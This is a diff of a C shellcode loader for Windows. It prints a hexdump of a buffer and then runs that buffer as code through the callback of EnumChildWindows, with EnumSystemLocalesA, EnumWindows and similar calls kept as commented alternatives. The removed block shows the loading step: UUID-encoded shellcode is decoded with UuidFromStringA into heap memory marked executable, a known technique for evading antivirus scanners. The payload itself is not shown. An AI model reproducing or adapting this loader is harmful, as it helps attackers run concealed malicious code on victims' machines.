@@ -138,35 +138,8 @@ int main()
 	    printf("%02X ", ((unsigned char*)ha)[i]);
 	}
 
-	 EnumChildWindows(NULL, (WNDENUMPROC)ha, 0);
-	 CloseHandle(ha);
-
-
-
-	
-
-
-    //HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);//在进程的虚拟地址空间中保留空间
-    //void* ha = HeapAlloc(hc, 0, 0x100000);//申请内存
-    //DWORD_PTR hptr = (DWORD_PTR)ha;
-    //int elems = sizeof(uuids) / sizeof(uuids[0]);
-
-
-    //for (int i = 0; i < elems; i++) {
-    //    RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);//UUID转换为原来的shellcode写入内存
-    //    if (status != RPC_S_OK) {
-    //        printf("UuidFromStringA() != S_OK\n");
-    //        CloseHandle(ha);
-    //        return -1;
-    //    }
-    //    hptr += 16;
-    //}
-
-    //printf("[*] Hexdump: ");
-    //for (int i = 0; i < elems * 16; i++) {
-    //    printf("%02X ", ((unsigned char*)ha)[i]);
-    //}
-    // EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);//枚举操作系统上安装或支持的语言环境
+	EnumChildWindows(NULL, (WNDENUMPROC)ha, 0);
+	// EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
     // EnumTimeFormatsA((TIMEFMT_ENUMPROCA)ha, 0, 0);
     // EnumWindows((WNDENUMPROC)ha, 0);
     // EnumDesktopWindows(NULL,(WNDENUMPROC)ha, 0);
@@ -179,6 +152,8 @@ int main()
     // EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)ha, 0);
     // EnumDateFormatsA((DATEFMT_ENUMPROCA)ha, 0, 0);
     // EnumChildWindows(NULL, (WNDENUMPROC)ha, 0);
-    // CloseHandle(ha);
+	CloseHandle(ha);
+
+
     return 0;
 }
